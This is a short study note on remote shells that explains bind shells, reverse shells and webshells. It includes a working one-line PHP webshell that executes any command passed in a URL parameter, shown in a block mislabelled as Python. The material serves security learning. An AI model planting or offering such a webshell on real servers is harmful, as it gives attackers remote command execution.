# Remote Shell Overview

A remote shell is method used by threat actors to execute commands on a remote system as if they were operating directly on that system

* Change your terminal tty size with `stty {rows|cols} <number>`

![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)

# Remote Shell Connection Types

| Remote Shell Connection Type | Description |
| --- | --- |
| Bind Shell | The target host opens a port that the attacking host will connect to |
| Reverse Shell | The attacking host opens a port that the target host will connect to |
| Webshell | A malicious script that a threat actor uses to gain unauthorized access to and execute code on a web server |

## Bind Shell

A bind shell is a type of shell where the target host opens a port that the attacking host will connect to

* The target executes code that starts up a listener on a port on their machine
* Can be prevented by firewalls

## Reverse Shell

A reverse shell is a type of shell where the attacking host opens a port that the target host will connect to

 * The target is forced to execute code that connects back to your computer
 * A good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target
 * Receiving a shell from a machine across the internet requires you to configure your own network to accept the shell

## Webshell

* Usually in a language such as PHP or ASP
* The commands are entered into a webpage or directly as arguments in the URL, which are then executed by the malicious script
* The results are usually returned and written to the webpage
* Useful if there's firewalls in place

```Python
# This script will take a GET parameter in the URL and execute any command that's entered in the URL after '?cmd='

<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
# shell_exec() executes the specified commands on the system
# <pre></pre> ensure that the results are formatted correctly on the page
```

![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/W19gHwLhvjhcvvjhvkhvkkv.png)

![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)

# Shell Types

| Shell Type | Description |
| --- | --- |
| Non-Interactive Shell | Allows you to use programs that don't require user interaction in order to run properly |
| Interactive Shell | Allows you to interact with programs after executing them |

## Non-Interactive Shell

## Interactive Shell
